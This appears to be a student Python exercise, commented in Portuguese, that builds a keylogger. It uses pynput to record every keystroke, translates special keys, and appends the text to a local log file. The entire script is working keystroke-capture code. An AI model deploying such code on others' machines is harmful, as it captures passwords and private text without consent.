#em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener



#definir a localização do arquivo de log
logFile = "C:\\Users\\AULA-1\\Documents\\(Engenharia de Software)\\Fase 1\\Linguagem de Programação\\Programa-o_em_Python\\log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #dicionário com as teclas a serem traduzidas
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.backspace": "", #\b porém não funciona correto
        "Key.shift": "",
        "Key.right":"",
        "Key.left":"",
        "Key.shift":"",
        "Key.ctrl_l":"",
        "Key.tab":"\t",
        "Key.ctrl_l\x13":"#(ARQUIVO SALVO)#",
        "Key.down":"",
        "Key.up":"",
        "<96>": "0", # inicio ----  Numeros do teclado ao lado.
        "<97>":"1",
        "<98>": "2",
        "<99>": "3",
        "<100>": "4",
        "<101>": "5",
        "<102>": "6",
        "<103>": "7",
        "<104>": "8",
        "<105>": "9",# FIM ----  Numeros do teclado ao lado.
        "Key.f2":"",
    }

    #converter a tecla pressionada para string
    keydata = str(key)

    #remover as asplas simples que delimitam os caracteres
    keydata = keydata.replace("'", "")

    for key in translate_keys:
        #key recebe a chave do dicionário translate_keys
        #substituir a chave (key) pelo seu valor (translate_keys[key])
        keydata = keydata.replace(key, translate_keys[key])

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    print("Esta escutando...\n")
    l.join()